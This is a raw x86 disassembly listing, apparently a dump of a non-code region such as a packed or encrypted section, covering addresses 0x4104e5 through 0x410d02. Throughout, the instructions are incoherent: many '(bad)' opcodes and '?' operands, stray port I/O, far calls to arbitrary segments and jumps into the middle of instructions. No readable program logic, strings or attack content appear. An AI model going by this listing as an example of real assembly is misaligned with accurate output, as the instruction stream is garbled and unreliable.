  4104e5:	ret    0xeb4c
  4104e8:	fidivr DWORD PTR [edx+0x12]
  4104eb:	inc    esp
  4104ec:	shl    DWORD PTR [esi+0x49],cl
  4104ef:	leave  
  4104f0:	sbb    cl,ah
  4104f2:	lea    eax,[eax-0x7117275a]
  4104f8:	call   0x917f:0x327e524e
  4104ff:	mov    edi,0x540f8dc6
  410504:	adc    BYTE PTR [ebx+0x2f59f74a],ah
  41050a:	add    eax,0x4b7e997
  41050f:	mov    ?,ebx
  410511:	in     al,0x35
  410513:	add    BYTE PTR [edi-0x17],dh
  410516:	dec    ecx
  410517:	test   ax,0x3e36
  41051b:	mov    DWORD PTR [esi-0x170ca11],ebx
  410521:	add    esi,DWORD PTR [ebx+0x63]
  410524:	cdq    
  410525:	adc    DWORD PTR [edi-0x2e258cfe],ebx
  41052b:	add    BYTE PTR [ebp-0x67317a24],0xca
  410532:	dec    eax
  410533:	inc    esi
  410534:	lods   eax,DWORD PTR ds:[esi]
  410535:	and    BYTE PTR [esi+ecx*4],ah
  410538:	cmp    al,0xe9
  41053a:	lds    ebx,FWORD PTR [ebx]
  41053c:	in     al,dx
  41053d:	leave  
  41053e:	push   es
  41053f:	in     eax,0x4a
  410541:	cmc    
  410542:	test   BYTE PTR [eax],dh
  410544:	repz mov cl,0x16
  410547:	(bad)
  41054b:	sub    ebp,DWORD PTR [esi-0x61]
  41054e:	dec    esp
  41054f:	mov    gs,WORD PTR [ecx-0x5811667c]
  410555:	mov    edx,0xf9c7a9c4
  41055a:	or     DWORD PTR [ecx-0x6dc9fe6e],0x70
  410561:	je     0x4105bf
  410563:	mov    ds,ecx
  410565:	sbb    BYTE PTR [edi+ecx*8+0x32b1a1fb],al
  41056c:	lods   eax,DWORD PTR ds:[esi]
  41056d:	push   edx
  41056e:	xor    cl,BYTE PTR [ebx]
  410570:	fiadd  WORD PTR [edi+0x7eef36c9]
  410576:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410577:	mov    dl,BYTE PTR [ebp+ecx*4-0x31]
  41057b:	mov    ds,WORD PTR [eax-0x55a35c7c]
  410581:	ret    0x1f4f
  410584:	lods   eax,DWORD PTR ds:[esi]
  410585:	mov    ?,WORD PTR [ebx+0x69]
  410588:	nop
  410589:	jl     0x410556
  41058b:	pslld  mm7,mm4
  41058e:	mov    ebx,0x261ea01e
  410593:	and    DWORD PTR [edx+0x3a0aaeb0],ebp
  410599:	inc    ecx
  41059a:	popa   
  41059b:	xchg   esi,eax
  41059c:	test   eax,0xc5db818a
  4105a1:	andnps xmm5,xmm1
  4105a4:	mov    esp,eax
  4105a6:	xchg   DWORD PTR [esi-0x1248cbfe],ecx
  4105ac:	(bad)  
  4105ad:	fsubr  QWORD PTR [ecx+ebx*1+0x21]
  4105b1:	jo     0x410537
  4105b3:	loop   0x410616
  4105b5:	(bad)  
  4105b6:	pop    edi
  4105b7:	mov    dl,0xc8
  4105b9:	mov    dl,0x47
  4105bb:	data16 sbb BYTE PTR [ecx],dl
  4105be:	sub    ecx,DWORD PTR [ebx]
  4105c0:	jns    0x41059b
  4105c2:	imul   ecx,DWORD PTR [ebp-0x2b],0x7e3f8594
  4105c9:	adc    ecx,ebx
  4105cb:	pop    es
  4105cc:	xor    eax,0x998e92a0
  4105d1:	outs   dx,DWORD PTR ds:[esi]
  4105d2:	add    edx,ecx
  4105d4:	lahf   
  4105d5:	int    0x1f
  4105d7:	rcl    edx,cl
  4105d9:	mov    dh,0xcd
  4105db:	jle    0x410659
  4105dd:	adc    dh,BYTE PTR [eax-0x4aeede19]
  4105e3:	dec    esi
  4105e4:	xor    BYTE PTR [ecx+edx*8-0x7f],bl
  4105e8:	mov    esp,0x871385eb
  4105ed:	mov    eax,0xcf073430
  4105f2:	fmul   QWORD PTR [esi-0xe5adacc]
  4105f8:	dec    ebp
  4105f9:	and    BYTE PTR [ebx+0x3f],bl
  4105fc:	loope  0x4105be
  4105fe:	iret   
  4105ff:	push   cs
  410600:	mov    ah,0x7c
  410602:	int3   
  410603:	xchg   DWORD PTR [ebx-0x35],edx
  410606:	add    DWORD PTR [esi+0x23dc70bf],ecx
  41060c:	leave  
  41060d:	aaa    
  41060e:	jg     0x4105a0
  410610:	shl    bl,cl
  410612:	cmc    
  410613:	mov    eax,ds:0x8637934f
  410618:	lods   eax,DWORD PTR ds:[esi]
  410619:	out    dx,eax
  41061a:	add    DWORD PTR [esi+0x48c182f1],ecx
  410620:	xchg   ebp,eax
  410621:	sub    ecx,DWORD PTR [ebp+0x3a]
  410624:	out    0xc5,al
  410626:	xchg   ecx,eax
  410627:	or     eax,0xc35fdc67
  41062c:	xor    dl,BYTE PTR [edx+0x1e481aa9]
  410632:	mov    bh,0xf0
  410634:	pop    es
  410635:	xor    eax,0x85f4b2cb
  41063a:	mov    cl,BYTE PTR [eax-0x6064570d]
  410640:	arpl   WORD PTR [ecx+0xffdc445],ax
  410646:	sub    DWORD PTR [ecx+ebx*1-0x1a884f0],eax
  41064d:	mov    bh,0x1d
  41064f:	loope  0x4105e1
  410651:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410652:	in     al,0x4d
  410654:	pop    eax
  410655:	xor    al,0x55
  410657:	call   0x2578:0xa650ad9a
  41065e:	ror    BYTE PTR [esi+0x32d53672],1
  410664:	(bad)  
  410665:	push   ebp
  410666:	sub    esp,edi
  410668:	ror    BYTE PTR [edi-0x2fe73717],cl
  41066e:	add    eax,0x1511a5e1
  410673:	imul   esi,DWORD PTR [esi-0x43],0x57e76191
  41067a:	test   BYTE PTR [ebx+0x74],bh
  41067d:	enter  0x8c87,0xb3
  410681:	iret   
  410682:	xchg   di,ax
  410684:	out    0x85,al
  410686:	xchg   ebx,eax
  410687:	dec    ecx
  410688:	jecxz  0x41062b
  41068a:	repz repnz retf 
  41068d:	pop    edx
  41068e:	test   BYTE PTR [esi],dl
  410690:	or     BYTE PTR [ebp-0x45],0x38
  410694:	mov    eax,0x86620673
  410699:	adc    DWORD PTR [ebx-0x80],edx
  41069c:	lods   al,BYTE PTR ds:[esi]
  41069d:	xor    DWORD PTR [ebp+0x6f],esp
  4106a0:	pop    ss
  4106a1:	sub    eax,DWORD PTR [ebp+0x455c3a57]
  4106a7:	nop
  4106a8:	sbb    ch,bh
  4106aa:	or     BYTE PTR [ebp+0x4e8584d1],ah
  4106b0:	ret    
  4106b1:	adc    cl,ah
  4106b3:	add    ebp,ebx
  4106b5:	rol    BYTE PTR [ebp-0x9913316],0x4
  4106bc:	mov    cl,0xb7
  4106be:	retf   0x1a8f
  4106c1:	and    BYTE PTR [ebx-0x72],ch
  4106c4:	or     DWORD PTR [ebx-0x1ebe6ebd],0x860f96d4
  4106ce:	lahf   
  4106cf:	pop    ecx
  4106d0:	xchg   edx,eax
  4106d1:	mov    bh,0xbd
  4106d3:	ret    0x110c
  4106d6:	test   BYTE PTR [ebp+0x19],al
  4106d9:	pop    edi
  4106da:	xor    bh,al
  4106dc:	jl     0x4106bb
  4106de:	test   DWORD PTR [ebx-0x2f],edi
  4106e1:	call   0xdf54365d
  4106e6:	std    
  4106e7:	mov    gs,edi
  4106e9:	cs rol edx,0xe1
  4106ed:	xchg   ecx,eax
  4106ee:	inc    esp
  4106ef:	or     al,0xd3
  4106f1:	and    esp,DWORD PTR [edx-0x429507dc]
  4106f7:	pop    esi
  4106f8:	xchg   esi,eax
  4106f9:	and    cl,BYTE PTR gs:[esi-0x67af5090]
  410700:	leave  
  410701:	jl     0x41070d
  410703:	adc    al,0xd2
  410705:	fwait
  410706:	and    al,0xfd
  410708:	aam    0x9e
  41070a:	add    eax,0x5c79e8ea
  41070f:	mov    es,edi
  410711:	add    eax,0xdb909a65
  410716:	mov    dh,0xdd
  410718:	cmp    BYTE PTR [ebp-0x7c],dh
  41071b:	(bad)  
  41071d:	(bad)  
  41071e:	or     eax,esp
  410720:	mov    edi,0xeb8e9a16
  410725:	and    al,0x24
  410727:	xor    DWORD PTR [ebp-0x2dfa410d],edx
  41072d:	xchg   esi,eax
  41072e:	push   ecx
  41072f:	imul   ecx,DWORD PTR [edx-0x32],0xffffffdd
  410733:	fs inc ebx
  410735:	sbb    eax,0x79c7540a
  41073a:	xor    eax,0x6b67484d
  41073f:	(bad)  
  410741:	sbb    ebp,DWORD PTR [ecx-0x35a709a0]
  410747:	scas   al,BYTE PTR es:[edi]
  410748:	pop    ss
  410749:	adc    edx,eax
  41074b:	addr16 inc ecx
  41074d:	jne    0x410797
  41074f:	xor    dl,BYTE PTR [ecx]
  410751:	jg     0x410791
  410753:	cwde   
  410754:	xchg   edx,eax
  410755:	rol    BYTE PTR [eax+0x68e22b3b],1
  41075b:	lea    edx,[ecx+0x16b266e4]
  410761:	add    al,0xb7
  410763:	ficom  DWORD PTR [ebp-0x7b]
  410766:	test   BYTE PTR [esi+0xbadcbca],bh
  41076c:	mov    ds:0xd13c721c,al
  410771:	adc    ebx,ebx
  410773:	imul   ecx,DWORD PTR [eax+0x4fbbf732],0xffffffcd
  41077a:	test   BYTE PTR [eax-0x4f],al
  41077d:	pop    edx
  41077e:	fild   DWORD PTR [edi-0x520bbb2e]
  410784:	cdq    
  410785:	adc    DWORD PTR [esi-0x1a],edx
  410788:	sub    eax,0xb5c58d5f
  41078d:	mov    ebp,0x397cfc82
  410792:	(bad)  
  410793:	mov    ds,WORD PTR [edx]
  410795:	mov    al,ds:0x248dd1e0
  41079a:	leave  
  41079b:	mov    ebp,0xc83e82d2
  4107a0:	sub    DWORD PTR [edi+0x1ed25a14],eax
  4107a6:	fwait
  4107a7:	lods   eax,DWORD PTR ds:[esi]
  4107a8:	in     al,dx
  4107a9:	push   ebp
  4107aa:	fst    DWORD PTR [edx]
  4107ac:	or     BYTE PTR [ecx],dl
  4107ae:	pop    esp
  4107af:	adc    DWORD PTR [edx+0x47],0x7
  4107b3:	xchg   ebx,eax
  4107b4:	push   ebp
  4107b5:	inc    DWORD PTR [ebp+0x7ba6cc4d]
  4107bb:	out    dx,eax
  4107bc:	stc    
  4107bd:	std    
  4107be:	fs test DWORD PTR es:[ecx],edx
  4107c2:	repz push esp
  4107c4:	sbb    eax,0x6eb2cc48
  4107c9:	in     eax,0x51
  4107cb:	gs out 0x8e,eax
  4107ce:	dec    edx
  4107cf:	push   cs
  4107d0:	jo     0x41080b
  4107d2:	test   BYTE PTR [edi-0x28],dh
  4107d5:	xor    DWORD PTR ds:0xa18d878e,eax
  4107db:	imul   edx,esi,0xfffffff2
  4107de:	mov    ds:0x83acd228,eax
  4107e3:	dec    edx
  4107e4:	xchg   edx,eax
  4107e5:	(bad)  [edx+0xa752a2e]
  4107eb:	xchg   ebx,eax
  4107ec:	inc    esi
  4107ed:	(bad)  
  4107ee:	jl     0x4107bf
  4107f0:	mov    esp,0x4fac7446
  4107f5:	stc    
  4107f6:	test   DWORD PTR [esi],ecx
  4107f8:	or     esp,DWORD PTR [edi]
  4107fa:	ret    
  4107fb:	(bad)  
  4107fc:	(bad)  
  4107fd:	or     ebp,DWORD PTR [eax-0x3f44c972]
  410803:	cmp    eax,0xcd48e78b
  410808:	lods   eax,DWORD PTR ds:[esi]
  410809:	(bad)  
  41080a:	fnclex 
  41080c:	xchg   edi,eax
  41080d:	jo     0x41088a
  41080f:	mov    esi,0x8e9ed30d
  410814:	inc    esp
  410815:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410816:	sbb    ch,BYTE PTR [ebx-0x21]
  410819:	cdq    
  41081a:	or     DWORD PTR [edi-0x29069f2e],0x47
  410821:	push   edi
  410822:	mov    ?,WORD PTR [ecx-0x4d66eec7]
  410828:	add    edx,DWORD PTR [edi-0x2]
  41082b:	adc    bh,BYTE PTR [eax+0x61d845a]
  410831:	rcl    BYTE PTR [edi-0x21a28eca],cl
  410837:	mov    gs,WORD PTR [edx-0x7ab74d51]
  41083d:	loop   0x41081d
  41083f:	leave  
  410840:	out    0x32,eax
  410842:	sub    ebp,DWORD PTR [ecx]
  410844:	test   al,0x91
  410846:	out    dx,eax
  410847:	or     eax,0xe3b4b69e
  41084c:	enter  0xa67,0x8e
  410850:	xor    al,0x76
  410852:	lods   eax,DWORD PTR ds:[esi]
  410853:	push   ecx
  410854:	sbb    BYTE PTR [ecx-0x772d7053],al
  41085a:	retf   
  41085b:	and    esp,DWORD PTR [eax-0x2]
  41085e:	ret    0xb563
  410861:	adc    al,0x71
  410863:	xchg   edi,eax
  410864:	xor    al,0xfd
  410866:	in     eax,0x2a
  410868:	add    eax,0xd507ee72
  41086d:	cmp    esp,DWORD PTR [ebp-0x2d]
  410870:	test   al,0x11
  410872:	addr16 pop ss
  410874:	inc    DWORD PTR [esi]
  410876:	jne    0x410810
  410878:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410879:	shl    BYTE PTR [ebx-0x1d],1
  41087c:	mov    dl,0x20
  41087e:	or     BYTE PTR [eax-0xb],al
  410881:	ss out dx,al
  410883:	shl    DWORD PTR [ecx-0x69de7a39],1
  410889:	stc    
  41088a:	shr    DWORD PTR [ebx],1
  41088c:	int    0x11
  41088e:	(bad)  
  41088f:	nop
  410890:	pop    esp
  410891:	mov    edx,0x8b71a78e
  410896:	dec    DWORD PTR [ebp-0x1138ac06]
  41089c:	jns    0x41086d
  41089e:	(bad)
  4108a1:	adc    DWORD PTR ds:0x38828e4d,ebx
  4108a7:	cmp    DWORD PTR [eax+eax*4-0x7b],esi
  4108ab:	shl    ebx,1
  4108ad:	xchg   ebp,eax
  4108ae:	ss push 0x8eee0671
  4108b4:	mov    bh,0x0
  4108b6:	mov    edx,0x6791a88b
  4108bb:	jns    0x41088f
  4108bd:	in     eax,0x21
  4108bf:	cmp    eax,0x382a59af
  4108c4:	loop   0x4108ee
  4108c6:	cmp    esp,DWORD PTR [ecx]
  4108c8:	mov    bh,0xe
  4108ca:	add    bh,BYTE PTR [ebx]
  4108cc:	push   edx
  4108cd:	xor    eax,0xbf6f3ee6
  4108d2:	out    dx,al
  4108d3:	jecxz  0x410937
  4108d5:	call   0xd22cf95e
  4108da:	add    eax,0xfd4de348
  4108df:	mov    cs,WORD PTR [esi-0x2938ba92]
  4108e5:	jno    0x41095c
  4108e7:	fs test eax,0xb9158695
  4108ed:	shl    ch,0x85
  4108f0:	push   ss
  4108f1:	lahf   
  4108f2:	or     al,0x98
  4108f4:	mov    esp,0xfb841c5e
  4108f9:	popa   
  4108fa:	add    al,0x76
  4108fc:	inc    ebp
  4108fd:	dec    ebp
  4108fe:	aaa    
  4108ff:	faddp  st(6),st
  410901:	mov    dl,0xa4
  410903:	mov    BYTE PTR [ecx],al
  410905:	jp     0x41090b
  410907:	and    dh,ch
  410909:	ret    0x8fda
  41090c:	push   ss
  41090d:	adc    BYTE PTR [ecx+0x30],bl
  410910:	in     eax,dx
  410911:	push   cs
  410912:	xor    esp,edx
  410914:	(bad)  
  410915:	shl    DWORD PTR [ebp+0x0],0x83
  410919:	push   ebx
  41091a:	test   BYTE PTR [eax+ebp*8],al
  41091d:	jb     0x4108c0
  41091f:	bound  ebx,QWORD PTR [edx+0x35]
  410922:	ror    DWORD PTR [esp+ebx*8+0x101d2dc4],cl
  410929:	mov    ebp,0x86fb38e5
  41092e:	out    dx,eax
  41092f:	mov    edi,DWORD PTR [ebp-0x7b]
  410932:	nop
  410933:	xchg   ebx,eax
  410934:	aad    0xde
  410936:	mov    bh,0x72
  410938:	daa    
  410939:	xchg   ecx,eax
  41093a:	add    al,BYTE PTR [ecx+ebp*8+0x6d]
  41093e:	cdq    
  41093f:	mov    fs,WORD PTR [eax]
  410941:	mov    bl,0x86
  410943:	rcr    esi,1
  410945:	cmp    dl,BYTE PTR [edi+0x10]
  410948:	shl    DWORD PTR [ecx-0x3f6bd460],0x26
  41094f:	shr    BYTE PTR [ecx-0x2d4fa7b9],0xf0
  410956:	jbe    0x410964
  410958:	mov    ecx,0x8cfdfa11
  41095d:	movsx  edi,BYTE PTR [eax-0x750360b4]
  410964:	jo     0x4109d9
  410966:	scas   eax,DWORD PTR es:[edi]
  410967:	test   al,0x52
  410969:	fcom   DWORD PTR [edi]
  41096b:	adc    edi,DWORD PTR [ebp-0x65]
  41096e:	xlat   BYTE PTR ds:[ebx]
  41096f:	mov    ss,WORD PTR [edi]
  410971:	popa   
  410972:	gs out dx,al
  410974:	jbe    0x410902
  410976:	repz xor al,0xb6
  410979:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41097a:	test   edx,edi
  41097c:	add    eax,ebp
  41097e:	push   0x30c673e4
  410983:	lea    ebp,[esi-0x7b]
  410986:	jg     0x4109b1
  410988:	clc    
  410989:	push   ebp
  41098a:	data16 sar BYTE PTR ss:[edi-0x1e830801],cl
  410992:	jle    0x410947
  410994:	or     bl,BYTE PTR [edx]
  410996:	xor    DWORD PTR [eax-0x71dc5d44],ebp
  41099c:	sub    eax,0x20073e43
  4109a1:	fild   DWORD PTR [ebp-0x1d7ad10]
  4109a7:	add    ebp,ebp
  4109a9:	cli    
  4109aa:	jo     0x41093a
  4109ac:	inc    esp
  4109ad:	mov    ecx,0xd79dd05a
  4109b2:	lods   al,BYTE PTR ds:[esi]
  4109b3:	aaa    
  4109b4:	or     ah,dh
  4109b6:	rcr    BYTE PTR [edi+0x6e5956bb],0x72
  4109bd:	sbb    eax,0x10abc2e5
  4109c2:	and    ah,BYTE PTR [esi-0x1fa1a997]
  4109c8:	mov    edx,0xd2d554b8
  4109cd:	xor    BYTE PTR [eax],0x3d
  4109d0:	lods   eax,DWORD PTR ds:[esi]
  4109d1:	(bad)  
  4109d3:	rol    BYTE PTR [ebp+0x7f71fb11],0x28
  4109da:	cmp    al,0x2c
  4109dc:	add    BYTE PTR [eax-0x79],0xd
  4109e0:	sub    al,BYTE PTR [ecx-0x78]
  4109e3:	and    al,0x8d
  4109e5:	cwde   
  4109e6:	(bad)  
  4109e7:	dec    bh
  4109e9:	pop    ebx
  4109ea:	xlat   BYTE PTR ds:[ebx]
  4109eb:	xchg   edi,eax
  4109ec:	mov    ch,0xc2
  4109ee:	icebp  
  4109ef:	das    
  4109f0:	imul   ebp,DWORD PTR [esi-0xe],0x85ee4cba
  4109f7:	sbb    BYTE PTR [edx],dh
  4109f9:	pop    DWORD PTR [edi+0xe]
  4109fc:	xchg   BYTE PTR [edi],ch
  4109fe:	xor    edx,DWORD PTR [esi-0x23ed93ff]
  410a04:	mov    bl,0x51
  410a06:	mov    ah,0x54
  410a08:	test   BYTE PTR [edx-0x7c],dl
  410a0b:	cmp    eax,DWORD PTR [ecx-0x4e]
  410a0e:	sub    ebp,DWORD PTR [edx+0x3f]
  410a11:	gs inc esi
  410a13:	(bad)  
  410a14:	cld    
  410a15:	add    cl,BYTE PTR [eax]
  410a17:	lds    edi,FWORD PTR [edx+0x554da9e9]
  410a1d:	mov    ecx,0x5607c2df
  410a22:	pop    eax
  410a23:	aas    
  410a24:	rcl    BYTE PTR [edx+ebx*2+0x7477bd15],cl
  410a2b:	sbb    al,0x21
  410a2d:	adc    esp,ebp
  410a2f:	not    esp
  410a31:	loope  0x410a31
  410a33:	rcr    DWORD PTR [esi],cl
  410a35:	daa    
  410a36:	test   ebx,edi
  410a38:	mov    bh,0xd2
  410a3a:	cld    
  410a3b:	adc    ecx,DWORD PTR [ebx-0x37]
  410a3e:	cmp    cl,BYTE PTR [ebp+0x470ded98]
  410a44:	inc    esp
  410a45:	popf   
  410a46:	repnz push es
  410a48:	jmp    0x410a3d
  410a4a:	mov    DWORD PTR [esi],ecx
  410a4c:	sub    BYTE PTR [eax],0xce
  410a4f:	call   0xd5d0:0x8eedb8a3
  410a56:	mov    al,ds:0xc5af31c6
  410a5b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410a5c:	jmp    0x441f:0xe18c3a4c
  410a63:	enter  0x73bf,0xd4
  410a67:	imul   edi,DWORD PTR [ecx+eax*1+0x3],0x2d
  410a6c:	or     al,0xa1
  410a6e:	cmp    BYTE PTR [edi-0x5cf5cb2e],dh
  410a74:	push   edi
  410a75:	fistp  QWORD PTR [ecx+0x48]
  410a78:	dec    ebp
  410a79:	push   ds
  410a7a:	cmp    BYTE PTR [edi],al
  410a7c:	xchg   BYTE PTR [eax],bl
  410a7e:	stos   BYTE PTR es:[edi],al
  410a7f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410a80:	push   esp
  410a81:	mov    esp,0x8b5d2f85
  410a86:	dec    ecx
  410a87:	mov    BYTE PTR [ebx],cl
  410a89:	leave  
  410a8a:	adc    DWORD PTR [ebx+0xb190d2c],edx
  410a90:	aam    0xe7
  410a92:	inc    edx
  410a93:	ret    0x7647
  410a96:	push   0xf154d2e7
  410a9b:	in     al,dx
  410a9c:	bound  edx,QWORD PTR [esi]
  410a9e:	shr    DWORD PTR [edi+0x14c61099],cl
  410aa4:	mov    al,0x6a
  410aa6:	mov    es,edx
  410aa8:	dec    edx
  410aa9:	sar    BYTE PTR [ebp+0x31f2d2ea],cl
  410aaf:	ret    0x6ee3
  410ab2:	add    DWORD PTR [ebp-0x2d],ecx
  410ab5:	adc    DWORD PTR [edx-0x30cb989c],ebp
  410abb:	jle    0x410b0c
  410abd:	push   edx
  410abe:	mov    eax,DWORD PTR [esi+eiz*4-0x35]
  410ac2:	pop    eax
  410ac3:	mov    WORD PTR [ecx],?
  410ac5:	jbe    0x410aaf
  410ac7:	adc    BYTE PTR [edi-0x659bef0],bl
  410acd:	xor    eax,0x1c74bbe7
  410ad2:	cmc    
  410ad3:	scas   eax,DWORD PTR es:[edi]
  410ad4:	push   eax
  410ad5:	test   al,0x85
  410ad7:	in     eax,dx
  410ad8:	or     al,0xf6
  410ada:	call   0xb48e:0xc7ba6025
  410ae1:	or     BYTE PTR [esi+0x2f93727d],dl
  410ae7:	es mov esi,0xdea8598
  410aed:	jne    0x410b18
  410aef:	dec    ecx
  410af0:	sar    ebp,cl
  410af2:	fisttp DWORD PTR [esi-0x7526b3b7]
  410af8:	call   0xfe62:0xd27e2e76
  410aff:	jnp    0x410ab9
  410b01:	jl     0x410a8e
  410b03:	leave  
  410b04:	xor    BYTE PTR [ecx],dl
  410b06:	xor    cl,BYTE PTR [ecx]
  410b08:	lahf   
  410b09:	or     DWORD PTR [ebx],esi
  410b0b:	out    0x51,al
  410b0d:	fld    QWORD PTR [edi+esi*1-0x47a6785d]
  410b14:	xchg   edx,eax
  410b15:	stc    
  410b16:	fcom   QWORD PTR [ecx-0x15]
  410b19:	adc    DWORD PTR [esi+0x5c],esi
  410b1c:	sbb    al,0x31
  410b1e:	mov    eax,0x8b5be479
  410b23:	lea    esi,[esi]
  410b25:	mov    esi,cs
  410b27:	xor    bh,BYTE PTR [edx-0x72]
  410b2a:	sbb    DWORD PTR gs:[eax],edi
  410b2d:	fcomp  DWORD PTR es:[edx+0x2e]
  410b31:	outs   dx,BYTE PTR ds:[esi]
  410b32:	sbb    DWORD PTR [edx-0x326faf85],ebx
  410b38:	adc    ch,BYTE PTR [ecx]
  410b3a:	data16 jns 0x410aca
  410b3d:	loope  0x410b61
  410b3f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410b40:	scas   eax,DWORD PTR es:[edi]
  410b41:	xor    BYTE PTR [ebp-0x4a],ah
  410b44:	cld    
  410b45:	pop    ds
  410b46:	inc    ebp
  410b47:	vpsubb xmm2,xmm6,xmm3
  410b4b:	mov    gs,WORD PTR [ebp-0x48]
  410b4e:	xor    DWORD PTR [edx+eiz*1-0x10],ebx
  410b52:	pop    eax
  410b53:	outs   dx,BYTE PTR ds:[esi]
  410b54:	sar    dl,cl
  410b56:	adc    BYTE PTR [ecx+eiz*1+0x50e964dd],bh
  410b5d:	push   ds
  410b5e:	mov    cl,0xfc
  410b60:	sbb    DWORD PTR [ecx+0x1a5523c2],esp
  410b66:	dec    DWORD PTR [ebp+0x39]
  410b69:	adc    eax,0x2eb20e58
  410b6e:	(bad)  
  410b6f:	rep outs dx,DWORD PTR ds:[esi]
  410b71:	push   ds
  410b72:	std    
  410b73:	ja     0x410bc9
  410b75:	mov    ecx,0xf6b9d68d
  410b7a:	lea    edx,[ebx-0x6ea7ee19]
  410b80:	ins    DWORD PTR es:[edi],dx
  410b81:	mov    edx,0x11a9b47f
  410b86:	test   BYTE PTR [edi],0xdc
  410b89:	xlat   BYTE PTR ds:[ebx]
  410b8a:	jmp    0x85dab9dc
  410b8f:	adc    DWORD PTR [esi-0x6abf99ea],edx
  410b95:	adc    eax,DWORD PTR [ebp-0x72]
  410b98:	leave  
  410b99:	sub    edx,DWORD PTR [esi-0x4b6b718]
  410b9f:	and    edx,edx
  410ba1:	lock push 0x61
  410ba4:	imul   esi,DWORD PTR [ecx+0x118a9634],0x3de81b13
  410bae:	sbb    al,0xfb
  410bb0:	nop
  410bb1:	mov    ch,0x88
  410bb3:	icebp  
  410bb4:	sub    al,0xa2
  410bb6:	fld    QWORD PTR [ebp+0x33e24e74]
  410bbc:	cmp    DWORD PTR [ecx],edx
  410bbe:	aaa    
  410bbf:	or     DWORD PTR [edx+0x18],0xfffffff0
  410bc3:	add    edx,DWORD PTR ds:0xd2ddd235
  410bc9:	sub    dl,dh
  410bcb:	xchg   ebp,eax
  410bcc:	xor    DWORD PTR [esi],ecx
  410bce:	mov    esp,0xe411c031
  410bd3:	xchg   BYTE PTR [esi+0x6d93f036],dl
  410bd9:	lea    ebp,ds:0x971f5fdd
  410bdf:	into   
  410be0:	xchg   edi,eax
  410be1:	sub    eax,0xb9a518f
  410be6:	sahf   
  410be7:	mov    ?,WORD PTR [ecx-0x41]
  410bea:	dec    esi
  410beb:	cmc    
  410bec:	jge    0x410c42
  410bee:	loope  0x410c0e
  410bf0:	mov    ss,WORD PTR [ebp+eax*4-0x7503a6a4]
  410bf7:	(bad)  
  410bf8:	mov    al,0x80
  410bfa:	pusha  
  410bfb:	xchg   ebp,eax
  410bfc:	pushf  
  410bfd:	test   eax,0x37529b05
  410c02:	iret   
  410c03:	ds daa 
  410c05:	adc    eax,DWORD PTR [ebp+0x56036a0d]
  410c0b:	addps  xmm6,XMMWORD PTR [ecx]
  410c0e:	mov    al,0x8e
  410c10:	in     eax,dx
  410c11:	sub    edx,DWORD PTR [edi]
  410c13:	rcr    ch,0xc7
  410c16:	push   ss
  410c17:	lods   eax,DWORD PTR ds:[esi]
  410c18:	shr    dh,cl
  410c1a:	mov    eax,0xc904c3fb
  410c1f:	lea    ebp,[ecx]
  410c21:	ret    0xf233
  410c24:	cmp    DWORD PTR [ecx],edx
  410c26:	add    BYTE PTR [ebp+0x45],0x2e
  410c2a:	arpl   dx,di
  410c2c:	push   edx
  410c2d:	fucomi st,st(4)
  410c2f:	out    dx,al
  410c30:	mov    esi,ecx
  410c32:	add    eax,0x2f061150
  410c37:	mov    cl,0x8d
  410c39:	adc    DWORD PTR [eax-0x1887bfe5],esp
  410c3f:	(bad)  
  410c40:	pushf  
  410c41:	mov    ah,0xd1
  410c43:	inc    ebp
  410c44:	lods   al,BYTE PTR ds:[esi]
  410c45:	shl    bh,cl
  410c47:	pop    edx
  410c48:	push   ecx
  410c49:	push   edx
  410c4a:	shr    dh,cl
  410c4c:	pusha  
  410c4d:	jo     0x410c83
  410c4f:	lea    esp,[esi-0x54025174]
  410c55:	popa   
  410c56:	popa   
  410c57:	test   al,0xac
  410c59:	iret   
  410c5a:	and    DWORD PTR [esi+edi*4],esi
  410c5d:	retf   0xce60
  410c60:	mov    ds:0xf0b2c39c,al
  410c65:	add    BYTE PTR [ecx+0x43b07393],cl
  410c6b:	outs   dx,BYTE PTR ds:[esi]
  410c6c:	jmp    0xc67f:0xd2e0776d
  410c73:	call   0x7795dbe8
  410c78:	fld    DWORD PTR ds:0xd0f8866b
  410c7e:	sub    DWORD PTR [ecx+0x3644afb],ebp
  410c84:	repnz pop esi
  410c86:	test   BYTE PTR [eax-0x73],ch
  410c89:	aas    
  410c8a:	adc    ax,0xdba
  410c8e:	sbb    al,0x8d
  410c90:	aaa    
  410c91:	ret    
  410c92:	clc    
  410c93:	add    DWORD PTR [edx],edi
  410c95:	enter  0xae9e,0xb2
  410c99:	inc    edi
  410c9a:	test   BYTE PTR [ebp+0x3c2cdee0],dh
  410ca0:	or     eax,0xf2975468
  410ca5:	sbb    eax,0x7114ca07
  410caa:	mov    ds:0x85ccb22a,eax
  410caf:	imul   DWORD PTR [edx-0x386c96b2]
  410cb5:	out    dx,eax
  410cb6:	pop    ebx
  410cb7:	mov    ds,WORD PTR [esi+0x74]
  410cba:	xchg   edx,eax
  410cbb:	adc    BYTE PTR [ebx+edi*4+0x75d284f6],bl
  410cc2:	xlat   BYTE PTR ds:[ebx]
  410cc3:	gs daa 
  410cc5:	push   ss
  410cc6:	ins    DWORD PTR es:[edi],dx
  410cc7:	dec    eax
  410cc8:	outs   dx,DWORD PTR ds:[esi]
  410cc9:	js     0x410c62
  410ccb:	mov    gs,edx
  410ccd:	aas    
  410cce:	push   es
  410ccf:	sub    al,0xc
  410cd1:	sar    BYTE PTR [edi+eax*4-0x70b4442e],0x17
  410cd9:	xor    DWORD PTR [ebp-0x2c],edi
  410cdc:	jl     0x410cfc
  410cde:	test   al,0x39
  410ce0:	lods   al,BYTE PTR ds:[esi]
  410ce1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410ce2:	mov    edx,0x75fae040
  410ce7:	in     al,dx
  410ce8:	rol    BYTE PTR [eax],cl
  410cea:	pop    ss
  410ceb:	add    cl,BYTE PTR [ecx+0x33]
  410cee:	fld    DWORD PTR [ebp+0x25381e46]
  410cf4:	sbb    BYTE PTR [ecx+0x449535ef],0x84
  410cfb:	repz gs rcl bh,0xc6
  410d00:	sbb    edx,ecx
  410d02:	add    al,0x8e
